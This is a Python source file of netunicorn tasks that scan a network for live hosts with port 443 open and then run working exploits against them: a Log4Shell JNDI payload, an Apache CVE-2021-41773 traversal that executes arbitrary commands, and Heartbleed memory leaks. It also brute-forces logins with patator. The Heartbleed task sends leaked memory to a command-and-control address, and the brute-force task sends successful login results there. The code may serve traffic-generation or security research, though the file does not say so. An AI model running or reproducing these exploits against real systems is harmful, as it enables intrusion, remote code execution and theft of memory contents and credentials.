import ipaddress
import subprocess
import re
import pickle
import socket
import time
from enum import Enum
from typing import List

from netunicorn.base.task import Task, Success, Failure


class DetectHosts(Task):
    requirements = ["apt install -y inetutils-ping"]

    def __init__(self, network: str, dump_filename: str):
        self.network = ipaddress.ip_network(network, strict=True)
        self.dump_filename = dump_filename
        super().__init__()

    def run(self):
        alive_hosts: List[str] = []
        for host in self.network.hosts():
            try:
                output = subprocess.check_output(f"ping -c 1 -n -q {str(host)}", shell=True)
                if re.search("1 received", output.decode("utf-8")):
                    alive_hosts.append(str(host))
            except subprocess.CalledProcessError:
                pass

        with open(self.dump_filename, "wb") as f:
            pickle.dump(alive_hosts, f)

        return alive_hosts


class Detect443Port(Task):
    def __init__(self, hosts_filename: str):
        self.hosts_filename = hosts_filename
        super().__init__()

    def run(self):
        with open(self.hosts_filename, "rb") as f:
            alive_hosts = pickle.load(f)

        hosts_with_443: List[str] = []
        for host in alive_hosts:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            result = sock.connect_ex((host, 443))
            if result == 0:
                hosts_with_443.append(host)
            sock.close()

        with open(self.hosts_filename, "wb") as f:
            pickle.dump(hosts_with_443, f)

        return hosts_with_443


class CVE202144228(Task):
    requirements = ["pip install requests"]

    def __init__(self, cc_address: str, hosts_filename: str):
        self.hosts_filename = hosts_filename
        self.cc_address = cc_address
        super().__init__()

    def run(self):
        import requests as r

        with open(self.hosts_filename, "rb") as f:
            alive_hosts = pickle.load(f)

        for host in alive_hosts:
            r.get(
                f"https://{host}/",
                headers={'User-Agent': f'${{jndi:ldap://{self.cc_address}/exploit.class}}'},
                verify=False
            )


class CVE202141773(Task):
    requirements = ["pip install requests"]

    def __init__(self, hosts_filename: str, command: str):
        self.hosts_filename = hosts_filename
        self.command = command
        super().__init__()

    def run(self):
        import requests

        with open(self.hosts_filename, "rb") as f:
            alive_hosts = pickle.load(f)

        for host in alive_hosts:
            url = f"https://{host}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"
            data = f"echo Content-Type: text/plain; echo; {self.command}"
            requests.post(url, data=data, verify=False)


class CVE20140160(Task):
    requirements = ["pip install requests"]

    class TLSVersion(Enum):
        TLS_1_0 = 0x01
        TLS_1_1 = 0x02
        TLS_1_2 = 0x03
        TLS_1_3 = 0x04

    def __init__(self, cc_address: str, hosts_filename: str, count: int = 10, sleep_seconds: int = 1,
                 tls_version: TLSVersion = TLSVersion.TLS_1_0):
        self.hosts_filename = hosts_filename
        self.cc_address = cc_address
        self.count = count
        self.sleep_seconds = sleep_seconds
        self.tls_version = tls_version
        super().__init__()

    def run(self):
        import requests
        from netunicorn.library.heartbleed.heartbleeder import connect, send_hello, bleed

        with open(self.hosts_filename, "rb") as f:
            alive_hosts = pickle.load(f)

        for host in alive_hosts:
            connection = connect(host, 443)
            time.sleep(1)
            send_hello(connection, self.TLSVersion.TLS_1_0.value)
            time.sleep(1)
            result = ""
            for i in range(0, self.count):
                answer = bleed(connection, self.TLSVersion.TLS_1_0.value)
                if answer is not None:
                    result += answer
                time.sleep(self.sleep_seconds)

            requests.post(url=self.cc_address, json={"heartbleeded machine": host, 'data': result})


class PatatorHTTP(Task):
    requirements = [
        "apt install -y wget",
        "wget https://raw.githubusercontent.com/lanjelot/patator/master/patator.py -O /patator/patator.py",
        "wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/darkweb2017-top10000.txt -O /patator/passwords.txt",
    ]

    def __init__(self, hosts_filename: str, cc_address: str):
        self.hosts_filename = hosts_filename
        self.cc_address = cc_address
        super().__init__()

    def run(self):
        import requests as r

        with open(self.hosts_filename, "rb") as f:
            alive_hosts = pickle.load(f)

        for host in alive_hosts:
            result = subprocess.check_output(
                f"python /patator/patator.py http_fuzz url=https://{host}/api/login "
                f"user_pass=FILE0:FILE0 0=/patator/passwords.txt -x ignore:code=401",
                shell=True
            )
            if re.search("login successful", result.decode("utf-8")):
                r.post(url=self.cc_address, json={"host": host, 'data': result})
